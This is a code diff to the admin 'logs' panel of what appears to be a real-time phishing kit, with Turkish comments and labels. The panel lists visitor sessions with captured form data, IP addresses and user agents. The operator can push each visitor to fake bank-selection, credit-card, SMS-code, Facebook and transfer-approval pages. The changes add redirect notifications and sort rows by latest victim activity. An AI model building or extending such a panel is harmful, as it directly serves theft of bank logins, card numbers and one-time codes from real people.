@@ -15,7 +15,7 @@ import {
 } from "@/lib/bank-logo-constants";
 
 const SESSION_LIST_COLUMNS =
-  "id,public_id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
+  "id,public_id,created_at,updated_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
 
 const LOG_PAGE_SIZE = 100;
 
@@ -963,6 +963,20 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     }
   }, []);
 
+  // Admin'in kendi yonlendirmesi icin ince onay seridi (bildirim tercihinden bagimsiz)
+  const ROUTE_LABELS: Record<string, string> = {
+    win: "İsim & Profil", banken: "Banka Seçimi", banken2: "Banka Seçimi 2",
+    card: "Kredi Kartı", wait: "Bekleme", invalid_bank: "Hatalı Banka",
+    live_support: "Canlı Destek", congrats: "Tebrikler", sms: "SMS Onayı",
+    facebook: "Facebook", custom_question: "Özel Soru",
+    special_approval: "Özel Bildirim", generator1: "Generator 1", generator2: "Generator 2",
+  };
+  const toastRedirect = (step: string, label?: string) => {
+    try {
+      showBeautifulToast("Yönlendirildi", `Kullanıcı "${label || ROUTE_LABELS[step] || step}" sayfasına yönlendirildi.`);
+    } catch { /* ignore */ }
+  };
+
   const load = useCallback(async (pageArg?: number) => {
     if (!supabase) return;
 
@@ -983,7 +997,10 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           .or("is_hidden.is.false,is_hidden.is.null")
           .or("form_data->>pending_profile.is.null,form_data->>pending_profile.neq.true");
       }
-      query = query.order("created_at", { ascending: false });
+      // En son aktivite en ustte: form girisi/update olan log yukari tasinir.
+      query = query
+        .order("updated_at", { ascending: false, nullsFirst: false })
+        .order("created_at", { ascending: false });
 
       const { data, count } = await query.range(p * LOG_PAGE_SIZE, (p + 1) * LOG_PAGE_SIZE - 1);
       const fetchedRows = ((data ?? []) as any) as DemoSession[];
@@ -1152,8 +1169,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
               if (pageRef.current !== 0) return prev;
               return [newRow, ...prev].slice(0, LOG_PAGE_SIZE);
             }
-            const next = [...prev];
-            const prevRow = next[idx];
+            const prevRow = prev[idx];
             const merged = { ...prevRow, ...newRow };
             const incomingFd = newRow.form_data;
             const fdMissing =
@@ -1162,6 +1178,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             if (fdMissing && prevRow.form_data != null) {
               merged.form_data = prevRow.form_data;
             }
+            // Ilk sayfada guncellenen satiri en uste tasi (son aktivite ilk sirada)
+            if (pageRef.current === 0) {
+              return [merged, ...prev.filter((r) => r.id !== newRow.id)].slice(0, LOG_PAGE_SIZE);
+            }
+            const next = [...prev];
             next[idx] = merged;
             return next;
           });
@@ -1285,6 +1306,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         return;
       }
 
+      toastRedirect(targetStep);
       void load();
     } else if (action === "ban_ip") {
       const row = rowsRef.current.find(r => r.id === sessionId);
@@ -1358,6 +1380,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         } else if (!data) {
           // eslint-disable-next-line no-console
           console.warn("[admin] facebook yonlendirme 0 satir. pid:", facebookPromptPublicId, "uuid:", facebookPromptSessionId);
+        } else {
+          toastRedirect("facebook");
         }
         // BASARILI veya degilse: sadece load()
       } finally {
@@ -1429,6 +1453,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           },
         })
         .eq("id", sessionId);
+      toastRedirect("generator1");
       void load();
       return;
     }
@@ -1451,6 +1476,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       })
       .eq("id", smsPromptSessionId);
     setSmsPromptSessionId(null);
+    toastRedirect("sms");
     void load();
   }
 
@@ -1518,6 +1544,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       setApprovalPromptSessionId(null);
       setApprovalPromptType("");
       setApprovalCodeInput("");
+      toastRedirect("generator2");
       void load();
       return;
     }
@@ -1551,6 +1578,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       setApprovalCodeInput("");
       setTransferAmountInput("");
       setTransferMethodInput("smartid");
+      toastRedirect("special_approval", "Transfer Onayı");
       void load();
       return;
     }
@@ -1576,6 +1604,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     setApprovalPromptSessionId(null);
     setApprovalPromptType("");
     setApprovalCodeInput("");
+    toastRedirect("special_approval");
     void load();
   }
 
@@ -1606,6 +1635,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
     setQuestionPromptSessionId(null);
     setQuestionInput("");
+    toastRedirect("custom_question");
     void load();
   }
 
@@ -2022,6 +2052,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     setSpecialPromptSessionId(null);
     setSpecialMessage("");
     setSpecialImage(null);
+    toastRedirect("special_approval");
     void load();
   }
 
